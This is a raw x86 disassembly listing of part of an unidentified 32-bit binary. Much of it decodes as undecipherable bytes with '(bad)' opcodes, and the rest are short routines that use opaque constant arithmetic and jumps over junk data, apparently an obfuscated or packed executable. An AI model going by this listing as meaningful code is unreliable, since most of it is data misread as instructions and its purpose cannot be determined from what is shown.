  415710:	fsub   st(1),st
  415712:	sbb    DWORD PTR ds:[ecx],edi
  415715:	popa   
  415716:	xchg   ecx,eax
  415717:	(bad)  
  415718:	int3   
  415719:	pop    esp
  41571a:	pop    esi
  41571b:	cmp    BYTE PTR [ecx+0x3de2b06c],al
  415721:	shl    BYTE PTR [esi+0x10e5695e],0xca
  415728:	mov    WORD PTR [edx],?
  41572a:	adc    DWORD PTR [edx-0xd0e93b4],esi
  415730:	xor    eax,0x382cd64c
  415735:	or     bl,ah
  415737:	push   ebx
  415738:	pop    ss
  415739:	sub    eax,0x75cda666
  41573e:	cmp    esp,DWORD PTR [eax+edx*2]
  415741:	pushf  
  415742:	stos   DWORD PTR es:[edi],eax
  415743:	xchg   esi,eax
  415744:	or     ecx,DWORD PTR [edx]
  415746:	push   ds
  415747:	nop
  415748:	ds or  bl,cl
  41574b:	jge    0x4157c8
  41574d:	in     al,0x29
  41574f:	mov    eax,DWORD PTR [edi-0x11fdb098]
  415755:	cli    
  415756:	xchg   ecx,eax
  415757:	daa    
  415758:	daa    
  415759:	nop
  41575a:	stc    
  41575b:	clc    
  41575c:	pop    edx
  41575d:	int    0xe1
  41575f:	dec    esp
  415760:	jl     0x41570a
  415762:	mov    esp,0x5b90051a
  415767:	popa   
  415768:	ret    0xb95b
  41576b:	sbb    DWORD PTR [edi-0x20],ebp
  41576e:	add    DWORD PTR [esi-0x53],0x28fd5e62
  415775:	xchg   ebp,eax
  415776:	jle    0x4157c2
  415778:	dec    DWORD PTR es:[ecx]
  41577b:	out    0x8e,eax
  41577d:	scas   eax,DWORD PTR es:[edi]
  41577e:	loopne 0x4157f2
  415780:	dec    esi
  415781:	sbb    edi,DWORD PTR [ebx-0x62745cb9]
  415787:	mov    dl,0xf6
  415789:	nop
  41578a:	mov    al,0x1e
  41578c:	mul    DWORD PTR [esi+0x79b26dcf]
  415792:	xlat   BYTE PTR ds:[ebx]
  415793:	sub    ch,BYTE PTR [edx+0x1f]
  415796:	test   eax,0xd8b3fd59
  41579b:	fs call 0x97777527
  4157a1:	imul   eax,DWORD PTR [ecx+0x9],0x8b546356
  4157a8:	je     0x41574a
  4157aa:	out    0xfe,al
  4157ac:	stos   BYTE PTR es:[edi],al
  4157ad:	out    dx,eax
  4157ae:	push   cs
  4157af:	loopne 0x415761
  4157b1:	fs aam 0x65
  4157b4:	adc    DWORD PTR [ebp-0x848d1d8],esp
  4157ba:	mov    ds:0x22c0747f,al
  4157bf:	retf   0x3c4f
  4157c2:	jecxz  0x4157f5
  4157c4:	fwait
  4157c5:	jbe    0x4157e2
  4157c7:	ret    0x5243
  4157ca:	loope  0x415789
  4157cc:	xor    bl,ah
  4157ce:	add    BYTE PTR [eax],dl
  4157d0:	cmp    BYTE PTR [edi+0x333f0c49],0xb4
  4157d7:	iret   
  4157d8:	mov    ebp,0x400280cd
  4157dd:	mov    ebx,0x42ec88a6
  4157e2:	xor    DWORD PTR [esi-0x5b],ebp
  4157e5:	inc    ecx
  4157e6:	repz (bad) 
  4157e8:	repz add eax,DWORD PTR [ebx]
  4157eb:	ret    0x69a2
  4157ee:	repnz mov esi,0x589cca5
  4157f4:	into   
  4157f5:	pop    ds
  4157f6:	fidivr WORD PTR [ebx-0x70]
  4157f9:	js     0x4157df
  4157fb:	mov    ds:0x4770120c,al
  415800:	cld    
  415801:	and    BYTE PTR [ebx],bl
  415803:	call   0x17917a62
  415808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415809:	rcr    DWORD PTR [edx],1
  41580b:	mov    WORD PTR [edx],ss
  41580d:	aaa    
  41580e:	(bad)  
  41580f:	sbb    eax,0x22e8f2fe
  415814:	pushf  
  415815:	call   0x7c96:0x1921e356
  41581c:	adc    al,0x5b
  41581e:	xchg   ebx,eax
  41581f:	xchg   BYTE PTR [ecx-0x5645fb21],bh
  415825:	mov    ch,0xe3
  415827:	out    dx,eax
  415828:	sbb    BYTE PTR [eax-0x39],bh
  41582b:	scas   al,BYTE PTR es:[edi]
  41582c:	cmp    al,BYTE PTR [edx+ecx*4-0x44859bfd]
  415833:	cli    
  415834:	pop    ebx
  415835:	cmp    eax,0x5d84ba28
  41583a:	adc    eax,edx
  41583c:	add    esp,ecx
  41583e:	jne    0x41589c
  415840:	(bad)  
  415841:	pop    eax
  415842:	xor    al,0x57
  415844:	cld    
  415845:	jnp    0x415840
  415847:	push   ebx
  415848:	xor    bh,BYTE PTR [ecx-0x7fb382be]
  41584e:	push   eax
  41584f:	sti    
  415850:	repnz or DWORD PTR [ebx-0x125dc694],edi
  415857:	cmp    DWORD PTR [edx],0xa161c626
  41585d:	jno    0x41583d
  41585f:	xchg   esp,eax
  415860:	in     eax,dx
  415861:	xor    dl,BYTE PTR [edi]
  415863:	cmc    
  415864:	ret    0x2e73
  415867:	inc    edx
  415868:	xchg   esp,eax
  415869:	fpatan 
  41586b:	outs   dx,BYTE PTR ds:[esi]
  41586c:	pusha  
  41586d:	cmp    BYTE PTR [ecx+0xddd5c59],cl
  415873:	cwde   
  415874:	push   ss
  415875:	sar    DWORD PTR ss:0x1dc91d75,1
  41587c:	fbld   TBYTE PTR [edx+0x65]
  41587f:	retf   0x71fe
  415882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415883:	test   al,0x5a
  415885:	inc    esp
  415886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415887:	cmp    BYTE PTR [ecx+ebp*2-0x12],bl
  41588b:	out    dx,al
  41588c:	lods   eax,DWORD PTR ds:[esi]
  41588d:	test   eax,0x53eaedea
  415892:	fcom   DWORD PTR [edx-0x76b296a4]
  415898:	mov    ch,0x96
  41589a:	jg     0x41587b
  41589c:	mov    dh,0xa0
  41589e:	iret   
  41589f:	gs add eax,0xa52bf9af
  4158a5:	scas   eax,DWORD PTR es:[edi]
  4158a6:	sbb    ebx,edi
  4158a8:	lods   eax,DWORD PTR ds:[esi]
  4158a9:	or     eax,edx
  4158ab:	push   0x1
  4158ad:	add    eax,edi
  4158af:	push   eax
  4158b0:	lea    eax,[ebp-0x13]
  4158b3:	push   eax
  4158b4:	shl    ecx,0x1e
  4158b7:	call   0x411c08
  4158bc:	mov    eax,DWORD PTR [ebp+0x10]
  4158bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4158c2:	shrd   eax,ecx,0x2
  4158c6:	shr    ecx,0x2
  4158c9:	mov    ecx,DWORD PTR [ebp+0x10]
  4158cc:	mov    edx,DWORD PTR [ebp+0x14]
  4158cf:	xor    eax,esi
  4158d1:	xor    edx,edx
  4158d3:	or     eax,edx
  4158d5:	add    eax,edi
  4158d7:	push   0x1
  4158d9:	push   eax
  4158da:	mov    eax,DWORD PTR [ebp+0x8]
  4158dd:	shl    ecx,0x1e
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	shrd   eax,ecx,0x2
  4158e7:	shr    ecx,0x2
  4158ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4158ed:	mov    edx,DWORD PTR [ebp+0xc]
  4158f0:	xor    eax,esi
  4158f2:	xor    edx,edx
  4158f4:	or     eax,edx
  4158f6:	add    eax,edi
  4158f8:	push   eax
  4158f9:	shl    ecx,0x1e
  4158fc:	call   0x411c08
  415901:	push   0x1
  415903:	lea    eax,[ebp-0x13]
  415906:	push   eax
  415907:	mov    eax,DWORD PTR [ebp+0x10]
  41590a:	mov    ecx,DWORD PTR [ebp+0x14]
  41590d:	shrd   eax,ecx,0x2
  415911:	shr    ecx,0x2
  415914:	mov    ecx,DWORD PTR [ebp+0x10]
  415917:	mov    edx,DWORD PTR [ebp+0x14]
  41591a:	xor    eax,esi
  41591c:	xor    edx,edx
  41591e:	or     eax,edx
  415920:	add    eax,edi
  415922:	push   eax
  415923:	shl    ecx,0x1e
  415926:	call   0x411c08
  41592b:	mov    eax,DWORD PTR [ebp+0x10]
  41592e:	mov    ecx,DWORD PTR [ebp+0x14]
  415931:	shrd   eax,ecx,0x2
  415935:	shr    ecx,0x2
  415938:	mov    ecx,DWORD PTR [ebp+0x10]
  41593b:	mov    edx,DWORD PTR [ebp+0x14]
  41593e:	pop    edi
  41593f:	xor    eax,esi
  415941:	xor    edx,edx
  415943:	pop    esi
  415944:	shl    ecx,0x1e
  415947:	or     eax,edx
  415949:	pop    ebx
  41594a:	leave  
  41594b:	ret    0x10
  41594e:	mov    eax,DWORD PTR [esp+0x8]
  415952:	or     DWORD PTR ds:0x4284e5,0x7249
  41595c:	mov    ecx,DWORD PTR [esp+0x10]
  415960:	or     ecx,eax
  415962:	mov    DWORD PTR ds:0x428581,0x6956
  41596c:	mov    ecx,DWORD PTR [esp+0xc]
  415970:	jne    0x4159ee
  415976:	cmp    DWORD PTR ds:0x428455,0x0
  41597d:	mov    DWORD PTR ds:0x428575,0x1bde
  415987:	mov    DWORD PTR ds:0x428499,0x1ea7
  415991:	jmp    0x4159e5
  415996:	mov    eax,0x417c
  41599b:	mov    DWORD PTR ds:0x4285a1,ebx
  4159a1:	cmp    DWORD PTR ds:0x428455,0x0
  4159a8:	jne    0x4159d1
  4159ae:	push   DWORD PTR [ebp-0x28]
  4159b1:	call   DWORD PTR ds:0x42e0e0
  4159b7:	adc    DWORD PTR ds:0x4284e5,0x428429
  4159c1:	sub    DWORD PTR ds:0x42845d,0x428519
  4159cb:	and    DWORD PTR ds:0x428475,edi
  4159d1:	mov    DWORD PTR ds:0x42848d,0x6bfe
  4159db:	adc    DWORD PTR ds:0x4284fd,0x437a
  4159e5:	mov    eax,DWORD PTR [esp+0x4]
  4159e9:	mul    ecx
  4159eb:	ret    0x10
  4159ee:	push   ebx
  4159ef:	mul    ecx
  4159f1:	mov    ebx,eax
  4159f3:	mov    eax,DWORD PTR [esp+0x8]
  4159f7:	mul    DWORD PTR [esp+0x14]
  4159fb:	add    ebx,eax
  4159fd:	mov    eax,DWORD PTR [esp+0x8]
  415a01:	mul    ecx
  415a03:	add    edx,ebx
  415a05:	pop    ebx
  415a06:	ret    0x10
  415a09:	push   ebp
  415a0a:	mov    ebp,esp
  415a0c:	sub    esp,0x44
  415a0f:	push   ebx
  415a10:	push   esi
  415a11:	push   edi
  415a12:	mov    DWORD PTR [ebp-0x18],0x2
  415a19:	mov    DWORD PTR [ebp-0x14],0x29f0
  415a20:	mov    DWORD PTR [ebp-0x10],0x3716
  415a27:	mov    DWORD PTR [ebp-0x2c],0x4e09
  415a2e:	mov    DWORD PTR [ebp-0x28],0x4497
  415a35:	mov    DWORD PTR [ebp-0x24],0x5
  415a3c:	mov    DWORD PTR [ebp-0x20],0x2a0a
  415a43:	mov    DWORD PTR [ebp-0x1c],0x1
  415a4a:	mov    DWORD PTR [ebp-0xc],0xce6
  415a51:	mov    DWORD PTR [ebp-0x8],0x12b3
  415a58:	mov    DWORD PTR [ebp-0x4],0xb09
  415a5f:	mov    DWORD PTR [ebp-0x44],0x7617
  415a66:	mov    DWORD PTR [ebp-0x40],0x721a
  415a6d:	mov    DWORD PTR [ebp-0x3c],0x5151
  415a74:	mov    DWORD PTR [ebp-0x38],0x14aa
  415a7b:	mov    DWORD PTR [ebp-0x34],0x5a28
  415a82:	mov    DWORD PTR [ebp-0x30],0x19a8
  415a89:	mov    ecx,DWORD PTR [ebp-0x1c]
  415a8c:	mov    eax,DWORD PTR [ebp-0x20]
  415a8f:	xor    edx,edx
  415a91:	div    ecx
  415a93:	mov    ecx,DWORD PTR [ebp-0x24]
  415a96:	xor    edx,edx
  415a98:	mov    esi,0x1ac5
  415a9d:	push   0x20
  415a9f:	div    ecx
  415aa1:	mov    ecx,DWORD PTR [ebp-0x28]
  415aa4:	xor    edx,edx
  415aa6:	xor    eax,0x60dc
  415aab:	sub    eax,ecx
  415aad:	mov    ecx,DWORD PTR [ebp-0x2c]
  415ab0:	lea    edi,[eax+ecx*1-0x6300]
  415ab7:	mov    eax,DWORD PTR [ebp-0x4]
  415aba:	mov    ecx,DWORD PTR [ebp-0x8]
  415abd:	sub    eax,0x7721
  415ac2:	xor    eax,ecx
  415ac4:	mov    ecx,DWORD PTR [ebp-0xc]
  415ac7:	xor    eax,ecx
  415ac9:	or     eax,0x7bc9
  415ace:	xor    eax,0xfffff0db
  415ad3:	mov    ebx,edi
  415ad5:	sub    ebx,eax
  415ad7:	mov    eax,DWORD PTR [ebp-0x10]
  415ada:	mov    ecx,DWORD PTR [ebp-0x14]
  415add:	xor    eax,ecx
  415adf:	mov    ecx,DWORD PTR [ebp-0x18]
  415ae2:	sub    eax,esi
  415ae4:	div    ecx
  415ae6:	mov    ecx,0x211
  415aeb:	pop    edx
  415aec:	xor    eax,ecx
  415aee:	jmp    0x415ef7
  415af3:	push   ds
  415af4:	inc    ecx
  415af5:	cmp    edi,esi
  415af7:	mov    edx,0x9f9c24b7
  415afc:	push   ecx
  415afd:	mov    ebp,0x507903cf
  415b02:	sahf   
  415b03:	pushf  
  415b04:	mov    esp,0xc48ebebe
  415b09:	mov    esi,0x38cffbe
  415b0e:	mov    DWORD PTR [ebp+0x67ed6244],ecx
  415b14:	call   DWORD PTR [ebx-0x59890c54]
  415b1a:	popa   
  415b1b:	out    0x27,al
  415b1d:	dec    eax
  415b1e:	ficomp WORD PTR [eax]
  415b20:	jo     0x415ad7
  415b22:	and    ebp,DWORD PTR ds:0xea2de7c
  415b28:	out    dx,eax
  415b29:	loope  0x415abf
  415b2b:	pop    es
  415b2c:	sbb    DWORD PTR [esi-0x2b],edx
  415b2f:	shl    DWORD PTR [ebx],1
  415b31:	pop    es
  415b32:	retf   
  415b33:	cmc    
  415b34:	scas   al,BYTE PTR es:[edi]
  415b35:	mov    ch,0x3d
  415b37:	mov    ch,0x97
  415b39:	adc    al,0xcd
  415b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b3c:	pop    es
  415b3d:	pop    ecx
  415b3e:	aad    0x7d
  415b40:	cdq    
  415b41:	(bad)  
  415b42:	ins    BYTE PTR es:[edi],dx
  415b43:	cwde   
  415b44:	das    
  415b45:	test   al,0x9f
  415b47:	xor    edx,DWORD PTR [edi-0x7883fa77]
  415b4d:	imul   ebx,DWORD PTR [esi],0x9457efdf
  415b53:	or     ebx,DWORD PTR [ebp-0x5eb48ea8]
  415b59:	scas   al,BYTE PTR es:[edi]
  415b5a:	aad    0x7f
  415b5c:	push   eax
  415b5d:	loopne 0x415bd4
  415b5f:	leave  
  415b60:	cmp    DWORD PTR [esi+0x52],ecx
  415b63:	pop    edx
  415b64:	dec    ecx
  415b65:	mov    ebp,0x15f72311
  415b6a:	fdiv   st(6),st
  415b6c:	(bad)  
  415b6d:	(bad)  
  415b6e:	jecxz  0x415ba3
  415b70:	adc    eax,0xe900349c
  415b75:	(bad)  
  415b76:	mov    eax,ds:0x3aca75c1
  415b7b:	(bad)  
  415b7c:	cmp    esi,eax
  415b7e:	add    eax,0x32a7fdee
  415b83:	xlat   BYTE PTR ds:[ebx]
  415b84:	mov    ecx,0x53ceadcc
  415b89:	mov    ebp,0xa2634c09
  415b8e:	push   edx
  415b8f:	icebp  
  415b90:	inc    esi
  415b91:	imul   esi,esp,0x4f21f0ca
  415b97:	cmc    
  415b98:	xchg   esp,eax
  415b99:	sbb    DWORD PTR [ecx+esi*2],0x23cc1ec7
  415ba0:	push   eax
  415ba1:	sub    al,BYTE PTR [ebx+0x1b99d836]
  415ba7:	adc    esp,DWORD PTR [eax]
  415ba9:	imul   eax,DWORD PTR [ebx+0x2e626a1f],0x3487d5cd
  415bb3:	scas   al,BYTE PTR es:[edi]
  415bb4:	mov    ebp,0x46dc3aed
  415bb9:	xchg   esp,eax
  415bba:	jo     0x415bfb
  415bbc:	dec    eax
  415bbd:	cs repnz mov bh,0x5d
  415bc1:	rcl    DWORD PTR [edx-0x24],1
  415bc4:	shr    edi,1
  415bc6:	mov    dl,BYTE PTR [eax+0x1e8e1252]
  415bcc:	imul   ecx,edx,0x7e
  415bcf:	das    
  415bd0:	dec    eax
  415bd1:	adc    BYTE PTR es:[ebx],ch
  415bd4:	jns    0x415c29
  415bd6:	test   BYTE PTR [edi+ecx*4],0x28
  415bda:	hlt    
  415bdb:	push   eax
  415bdc:	rcr    BYTE PTR ds:0x685aa4cb,0x96
  415be3:	iret   
  415be4:	fsubrp st(1),st
  415be6:	out    0x28,eax
  415be8:	dec    edx
  415be9:	leave  
  415bea:	ja     0x415b8b
  415bec:	add    al,0x59
  415bee:	cs sub al,0xe5
  415bf1:	jns    0x415b7e
  415bf3:	adc    DWORD PTR [esi],ebx
  415bf5:	pop    edx
  415bf6:	in     al,0x82
  415bf8:	mov    al,0xad
  415bfa:	rcr    DWORD PTR [ecx],0x81
  415bfd:	scas   al,BYTE PTR es:[edi]
  415bfe:	jmp    0xe7c358a8
  415c03:	jne    0x415c5d
  415c05:	xor    eax,0x2fa2b005
  415c0a:	cmc    
  415c0b:	(bad)  
  415c0c:	or     al,0x75
  415c0e:	stc    
  415c0f:	das    
  415c10:	dec    esi
  415c11:	dec    ecx
  415c12:	sbb    BYTE PTR ss:[ebx+0x13],dl
  415c16:	xlat   BYTE PTR ds:[ebx]
  415c17:	xor    ebp,0x3b
  415c1a:	imul   edx,ebx,0x70
  415c1d:	dec    ebp
  415c1e:	cs nop
  415c20:	in     eax,0xaa
  415c22:	xchg   ecx,eax
  415c23:	cmp    BYTE PTR [eax],bh
  415c25:	push   ebp
  415c26:	sub    ax,0xc8b3
  415c2a:	ins    BYTE PTR es:[edi],dx
  415c2b:	clc    
  415c2c:	(bad)  
  415c2d:	cmp    al,dh
  415c2f:	mov    dl,al
  415c31:	(bad)  
  415c32:	pop    ds
  415c33:	cmp    ebx,esp
  415c35:	pop    edi
  415c36:	(bad)  
  415c37:	shl    BYTE PTR [ebp+0x4491b719],cl
  415c3d:	(bad)  
  415c3f:	mov    al,ds:0xdc9ece15
  415c44:	loopne 0x415bc8
  415c46:	in     eax,dx
  415c47:	hlt    
  415c48:	mov    ds,WORD PTR [ebx]
  415c4a:	es mov dh,BYTE PTR ss:[edi+ecx*4-0x55e1b247]
  415c53:	mov    BYTE PTR ds:0xe0255d44,ch
  415c59:	sbb    BYTE PTR [eax+0x6e5c8558],bh
  415c5f:	clc    
  415c60:	out    0x65,al
  415c62:	cmp    DWORD PTR [ebx+0xe040ca4],esi
  415c68:	dec    esp
  415c69:	test   eax,edx
  415c6b:	daa    
  415c6c:	mov    bl,ch
  415c6e:	pop    edx
  415c6f:	xor    eax,0x60ae108
  415c74:	sahf   
  415c75:	pop    ds
  415c76:	jge    0x415cd3
  415c78:	cmc    
  415c79:	retf   0xfc8f
  415c7c:	retf   
  415c7d:	jbe    0x415cc4
  415c7f:	xchg   edi,eax
  415c80:	cmp    BYTE PTR [ecx-0xf],cl
  415c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c84:	int3   
  415c85:	cmp    edx,edi
  415c87:	call   0xb9cb:0x51bf50ec
  415c8e:	icebp  
  415c8f:	sahf   
  415c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c91:	psubsw mm2,QWORD PTR [eax+ecx*4+0x2d]
  415c96:	or     edx,DWORD PTR [ebx-0x5a5dae94]
  415c9c:	add    eax,0x7fbb4e19
  415ca1:	test   BYTE PTR [esi],ah
  415ca3:	sub    ebp,DWORD PTR [ebx+0x2dde94f]
  415ca9:	dec    edx
  415caa:	or     eax,0x6ef7e704
  415caf:	les    esp,FWORD PTR [esi]
  415cb1:	ja     0x415d1a
  415cb3:	icebp  
  415cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cb5:	cwde   
  415cb6:	and    eax,0xc8a2b1d
  415cbb:	icebp  
  415cbc:	in     al,0xbb
  415cbe:	imul   edi,DWORD PTR [esp+edi*1-0x30],0x27
  415cc3:	shl    DWORD PTR [edi+eiz*1-0xe],1
  415cc7:	sub    dh,BYTE PTR [esi-0x1450c165]
  415ccd:	data16 jne 0x415c72
  415cd0:	arpl   di,bp
  415cd2:	mov    edx,0x2e1cdd50
  415cd7:	add    DWORD PTR [edi-0xd],ecx
  415cda:	push   esi
  415cdb:	inc    eax
  415cdc:	sub    ebp,DWORD PTR [ebx]
  415cde:	xchg   esi,eax
  415cdf:	int3   
  415ce0:	or     BYTE PTR [ebx],0x3d
  415ce3:	daa    
  415ce4:	mov    dl,0x42
  415ce6:	hlt    
  415ce7:	lds    edi,FWORD PTR [ebp+0x5d]
  415cea:	jg     0x415c88
  415cec:	sbb    esp,DWORD PTR [edi]
  415cee:	jae    0x415d5d
  415cf0:	test   BYTE PTR ds:0xac4f569a,ah
  415cf6:	inc    ebx
  415cf7:	aaa    
  415cf8:	out    dx,al
  415cf9:	mov    edi,0x395e5e2
  415cfe:	jp     0x415ca3
  415d00:	pop    edi
  415d01:	repz rcl BYTE PTR [ebx-0x63],0x7e
  415d06:	cmc    
  415d07:	gs popa 
  415d09:	cmp    ebp,ebx
  415d0b:	(bad)  
  415d0c:	lods   eax,DWORD PTR ds:[esi]
  415d0d:	xchg   ebp,eax
  415d0e:	ins    BYTE PTR es:[edi],dx
  415d0f:	and    DWORD PTR [ecx+edx*2+0x56],edx
  415d13:	div    DWORD PTR [ebp-0x3d]
  415d16:	(bad)  
  415d17:	mov    edx,0x35bef643
  415d1c:	popf   
  415d1d:	mov    ch,0x85
  415d1f:	mov    ah,ch
  415d21:	(bad)  
  415d23:	inc    edx
  415d24:	fwait
  415d25:	mov    ah,0x34
  415d27:	sub    eax,0xd67a7f68
  415d2c:	(bad)  
  415d2d:	gs cmp cl,ah
  415d30:	or     ebx,eax
  415d32:	mov    bl,0xf
  415d34:	ret    
  415d35:	jp     0x415d82
  415d37:	adc    eax,ebp
  415d39:	cmp    ah,dh
  415d3b:	xchg   esp,eax
  415d3c:	fstp   TBYTE PTR [eax-0x70624ea1]
  415d42:	or     al,0xb4
  415d44:	inc    edi
  415d45:	out    dx,al
  415d46:	arpl   WORD PTR [eax+0x5],cx
  415d49:	add    eax,0x8ae43f82
  415d4e:	shl    BYTE PTR [edi-0x719c7ba5],cl
  415d54:	cmp    DWORD PTR [esi+ebp*4-0x2291662d],eax
  415d5b:	std    
  415d5c:	stos   DWORD PTR es:[edi],eax
  415d5d:	pop    ss
  415d5e:	jmp    0x415d25
  415d60:	aaa    
  415d61:	push   esp
  415d62:	pop    edi
  415d63:	repz or BYTE PTR [esi+0x21],dh
  415d67:	loopne 0x415d05
  415d69:	or     esp,DWORD PTR [edi-0x60]
  415d6c:	mov    edi,ecx
  415d6e:	leave  
  415d6f:	hlt    
  415d70:	loope  0x415dbd
  415d72:	std    
  415d73:	jns    0x415d63
  415d75:	jno    0x415dd5
  415d77:	ret    0xb335
  415d7a:	push   cs
  415d7b:	lods   eax,DWORD PTR ds:[esi]
  415d7c:	mov    ds:0x9f8e747a,eax
  415d81:	out    dx,eax
  415d82:	and    edi,ecx
  415d84:	mov    cl,0x92
  415d86:	dec    esp
  415d87:	pop    es
  415d88:	push   cs
  415d89:	adc    edi,ecx
  415d8b:	test   al,0xe4
  415d8d:	jae    0x415dd5
  415d8f:	sbb    BYTE PTR [edi+0x42],cl
  415d92:	or     al,BYTE PTR [edx+0x7cb510e6]
  415d98:	sbb    eax,0x367c1f09
  415d9d:	xchg   BYTE PTR [edx+0x2f],bh
  415da0:	mov    ebx,?
  415da2:	cmp    BYTE PTR [ecx+0x3e696724],ah
  415da8:	dec    eax
  415da9:	and    eax,0xf225fdf5
  415dae:	lds    eax,FWORD PTR [esi+0x68]
  415db1:	(bad)  
  415db2:	jecxz  0x415e18
  415db4:	repnz dec eax
  415db6:	push   esi
  415db7:	mov    ebp,0x678750c
  415dbc:	dec    ebp
  415dbd:	xor    eax,0xdfd355fa
  415dc2:	adc    DWORD PTR [ecx+ebp*2],0x9f5048c0
  415dc9:	loopne 0x415d90
  415dcb:	ret    0x82d6
  415dce:	jbe    0x415ddf
  415dd0:	pop    ebx
  415dd1:	xchg   ebx,eax
  415dd2:	jmp    0x415daf
  415dd4:	sub    eax,0xfea55396
  415dd9:	sub    ebp,DWORD PTR [ebx-0xe]
  415ddc:	cli    
  415ddd:	repz cwde 
  415ddf:	cld    
  415de0:	retf   0x89df
  415de3:	jno    0x415db6
  415de5:	jle    0x415de1
  415de7:	jbe    0x415e43
  415de9:	test   al,0xca
  415deb:	jmp    0x3a2c:0x2aed4257
  415df2:	mov    esp,0xa8c99111
  415df7:	lods   eax,DWORD PTR ds:[esi]
  415df8:	pop    esi
  415df9:	(bad)  
  415dfa:	cs scas al,BYTE PTR es:[edi]
  415dfc:	push   esp
  415dfd:	jo     0x415e5e
  415dff:	jp     0x415dc0
  415e01:	sbb    al,BYTE PTR [edi-0x7ebc36d3]
  415e07:	das    
  415e08:	ins    BYTE PTR es:[edi],dx
  415e09:	pmullw mm7,QWORD PTR [ebp+0x4040504a]
  415e10:	mov    ebp,0x8d0caa70
  415e15:	xchg   esi,eax
  415e16:	(bad)  
  415e17:	mov    ebp,0xc4de609d
  415e1c:	push   esp
  415e1d:	mov    esp,0x18de7d89
  415e22:	inc    ebx
  415e23:	rcl    BYTE PTR [ecx],cl
  415e25:	xlat   BYTE PTR ds:[ebx]
  415e26:	int    0x5f
  415e28:	sahf   
  415e29:	adc    BYTE PTR [eax-0x5c6c3f16],0x4
  415e30:	test   dh,dh
  415e32:	cmp    BYTE PTR [edi],dh
  415e34:	sbb    dh,bl
  415e36:	in     eax,dx
  415e37:	adc    bl,BYTE PTR [ebx+0x206b4cf9]
  415e3d:	sbb    ebx,DWORD PTR [edi]
  415e3f:	mov    BYTE PTR [edi+0x7aea32e7],dl
  415e45:	pop    ss
  415e46:	push   eax
  415e47:	inc    esp
  415e48:	scas   eax,DWORD PTR es:[edi]
  415e49:	sbb    DWORD PTR gs:0x32a423d5,edx
  415e50:	or     ecx,DWORD PTR [eax]
  415e52:	pop    ss
  415e53:	sti    
  415e54:	jl     0x415e54
  415e56:	sub    BYTE PTR [edx+0x254d8a6d],cl
  415e5c:	in     eax,dx
  415e5d:	xchg   BYTE PTR [edx+0x1],dl
  415e60:	std    
  415e61:	mov    esp,0x8644dea9
  415e66:	cmc    
  415e67:	js     0x415e1e
  415e69:	int    0xd2
  415e6b:	mov    ch,0x8f
  415e6d:	mov    edx,0xf7cc2c32
  415e72:	dec    esp
  415e73:	in     eax,0x9
  415e75:	iret   
  415e76:	mov    al,0xc3
  415e78:	ja     0x415e89
  415e7a:	fiadd  DWORD PTR [ecx]
  415e7c:	cs scas eax,DWORD PTR es:[edi]
  415e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7f:	out    0xb7,al
  415e81:	popa   
  415e82:	test   al,0xb1
  415e84:	sub    al,0x82
  415e86:	push   eax
  415e87:	cmp    DWORD PTR [ecx+0x511f199],esi
  415e8d:	jmp    0x9b23:0xd2d57dbe
  415e94:	mov    DWORD PTR [ecx],ebx
  415e96:	fdiv   QWORD PTR [eax]
  415e98:	xchg   edi,eax
  415e99:	jecxz  0x415e2e
  415e9b:	int3   
  415e9c:	test   eax,0xea641f45
  415ea1:	ret    0x4034
  415ea4:	cmp    edx,ecx
  415ea6:	jno    0x415f11
  415ea8:	sbb    DWORD PTR [ecx-0x7],0x6
  415eac:	xor    BYTE PTR [ebp+0x2f],bl
  415eaf:	and    al,0x72
  415eb1:	ret    
  415eb2:	mov    edx,0xcc4bb285
  415eb7:	mov    ebx,0xf0d4a8a5
  415ebc:	jl     0x415f12
  415ebe:	sbb    al,0x77
  415ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ec1:	imul   ebp,DWORD PTR [eax-0x6b4f2423],0x41
  415ec8:	(bad)  
  415ec9:	mov    edx,0x6b6b2dc5
  415ece:	loope  0x415f1a
  415ed0:	mov    ch,0x12
  415ed2:	jge    0x415e9f
  415ed4:	sbb    BYTE PTR [edi+ebx*2-0x10],0x59
  415ed9:	pusha  
  415eda:	stc    
  415edb:	mov    si,0x6746
  415edf:	repz xchg esp,eax
  415ee1:	mov    edi,0x65f9dbbd
  415ee6:	adc    DWORD PTR [edi],esp
  415ee8:	dec    edx
  415ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eea:	pop    edx
  415eeb:	(bad)  
  415eec:	dec    ecx
  415eed:	test   BYTE PTR [ebp+0x6344da81],ah
  415ef3:	aam    0x2c
  415ef5:	fadd   DWORD PTR [ebx+ebp*1-0x30]
  415ef9:	cmp    ebx,edx
  415efb:	ja     0x4167d7
  415f01:	jmp    0x415f09
  415f06:	mov    edi,DWORD PTR [ebp-0x2c]
  415f09:	mov    DWORD PTR [ebp-0x20],0x1aa3
  415f10:	mov    DWORD PTR [ebp-0x24],0x52d
  415f17:	mov    DWORD PTR [ebp-0x28],0x226c
  415f1e:	jmp    0x416327
  415f23:	dec    eax
  415f24:	pop    edi
  415f25:	xor    ch,BYTE PTR [esi-0x48b34bc6]
  415f2b:	inc    edx
  415f2c:	imul   edx,edi,0xb2c84ee3
  415f32:	iret   
  415f33:	ins    BYTE PTR es:[edi],dx
  415f34:	(bad)  
  415f35:	sar    BYTE PTR [esi-0x41413b72],0xd5
  415f3c:	int    0x9a
  415f3e:	rcr    DWORD PTR [ecx-0x4f],0xef
  415f42:	pop    edi
  415f43:	test   ebp,ebx
  415f45:	mov    bl,0x1b
  415f47:	dec    eax
  415f48:	inc    eax
  415f49:	sub    BYTE PTR ds:0xf7ae28fa,dh
  415f4f:	jmp    0x415f70
  415f51:	sub    ah,BYTE PTR [edi-0x6b3c6d49]
  415f57:	xlat   BYTE PTR ds:[ebx]
  415f58:	pushf  
  415f59:	mov    ch,0x3c
  415f5b:	or     bh,BYTE PTR [edi+ecx*8+0x228ad607]
